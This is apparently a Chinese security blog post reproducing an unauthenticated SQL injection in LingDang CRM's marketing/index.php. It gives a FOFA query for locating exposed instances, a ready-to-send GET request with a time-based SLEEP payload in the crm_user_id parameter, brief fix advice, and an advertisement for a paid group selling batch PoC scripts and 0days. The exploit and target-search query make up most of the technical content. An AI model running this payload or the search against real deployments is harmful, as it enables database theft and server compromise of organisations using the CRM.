#  「漏洞复现」灵当CRM marketing/index.php SQL注入漏洞   
冷漠安全  冷漠安全   2024-09-21 15:17  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
灵当CRM是一款专为中小企业打造的智能客户关系管理工具，由上海灵当信息科技有限公司开发并运营。广泛应用于金融、教育、医疗、IT服务、房地产等多个行业领域，帮助企业实现客户个性化管理需求，提升企业竞争力。无论是新客户开拓、老客户维护，还是销售过程管理、服务管理等方面，灵当CRM都能提供全面、高效的解决方案。  
  
0x03  
  
**漏洞威胁**  
  
灵当CRM marketing/index.php 接口存在SQL注入漏洞,未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pgqvxjfhfBAORDxrWFoVCY8Cy3SrhopGxzy1dmgqnZxOj5ibicQHZ0UdQzzNYhmHaqVOAHeE2xlLicw/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1%20AND%20(SELECT%209552%20FROM%20(SELECT(SLEEP(4)))x) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```  
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pgqvxjfhfBAORDxrWFoVCYIKEUXecvxVVkLpMicrSWXxUKodVPy8bxdmYhUnQoG03kvk1zPFCLTeg/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pgqvxjfhfBAORDxrWFoVCYT9iatSSibR8twdKJDS0hkMM8SxhwrplTX8amoBSuWQ1IxvgRPJpr3dhg/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pgqvxjfhfBAORDxrWFoVCYFRiaXuLIYiaPEX2YXu2ia4m3N7WZY2z1DB8wChbJTiahFV5Y6uxhXox0pQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pgqvxjfhfBAORDxrWFoVCYSW2SQzzAF20n3MO3ia1BptPUknDNJicnPydN6eynJh9fXuqxqQOLXn7A/640?wx_fmt=gif&from=appmsg "")  
  
  
